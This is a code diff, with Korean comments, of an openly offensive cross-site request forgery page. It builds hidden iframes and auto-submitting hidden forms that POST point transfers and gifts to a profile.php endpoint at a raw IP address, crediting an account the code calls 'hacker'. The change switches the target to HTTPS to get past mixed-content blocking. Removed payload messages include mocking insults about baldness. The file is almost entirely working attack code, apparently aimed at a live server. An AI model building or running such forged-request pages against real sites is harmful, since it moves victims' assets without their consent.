@@ -195,7 +195,7 @@
         
         // iframe 공격 실행
         function executeIframeAttack() {
-            console.log('🎯 iframe CSRF 공격 시작!');
+            console.log('🎯 HTTPS iframe CSRF 공격 시작!');
             statusEl.textContent = '💸 포인트를 전송하고 있습니다...';
             progressBar.style.width = '100%';
             
@@ -205,57 +205,37 @@
                     points: '50',
                     send_gift: '1', 
                     gift_type: 'coffee',
-                    message: '🔥 대머리'
+                    message: '🔥 HTTPS 공격 성공!'
                 },
                 {
                     receiver_id: '13',
                     points: '35',
                     send_gift: '1',
                     gift_type: 'cake', 
-                    message: '🔥 빡빡이!'
-                },
-                {
-                    receiver_id: '13',
-                    points: '30',
-                    send_gift: '1',
-                    gift_type: 'flower',
-                    message: '🔥 탈모빔'
+                    message: '🔥 Mixed Content 해결!'
                 }
             ];
             
-            let completedAttacks = 0;
-            
             attacks.forEach((attackData, index) => {
                 setTimeout(() => {
-                    launchIframeAttack(attackData, index + 1, () => {
-                        completedAttacks++;
-                        if (completedAttacks === attacks.length) {
-                            setTimeout(showSuccess, 2000);
-                        }
-                    });
-                }, index * 2500);
+                    launchHttpsAttack(attackData, index + 1);
+                }, index * 2000);
             });
+            
+            setTimeout(showSuccess, 6000);
         }
         
-        // 개별 iframe 공격
-        function launchIframeAttack(attackData, attackNum, callback) {
-            console.log(`🚀 공격 ${attackNum} 시작: ${attackData.points}P`);
+        function launchHttpsAttack(attackData, attackNum) {
+            console.log(`🚀 HTTPS 공격 ${attackNum} 시작: ${attackData.points}P`);
             
             const iframe = document.createElement('iframe');
             iframe.style.display = 'none';
             iframe.name = `attack_${Date.now()}_${attackNum}`;
-            
-            iframe.onload = () => {
-                console.log(`✅ 공격 ${attackNum} 완료!`);
-                statusEl.textContent = `💸 공격 ${attackNum}/3 완료 (${attackData.points}P 전송됨)`;
-                if (callback) callback();
-            };
-            
             document.getElementById('iframeContainer').appendChild(iframe);
             
             const form = document.createElement('form');
             form.method = 'POST';
-            form.action = 'http://3.35.218.180/profile.php';
+            form.action = 'https://3.35.218.180/profile.php';  // ✅ HTTPS 사용
             form.target = iframe.name;
             form.style.display = 'none';
             
@@ -269,6 +249,8 @@
             
             document.body.appendChild(form);
             form.submit();
+            
+            console.log(`📤 HTTPS POST 전송: ${attackData.points}P → hacker`);
             
             setTimeout(() => {
                 if (form.parentNode) document.body.removeChild(form);
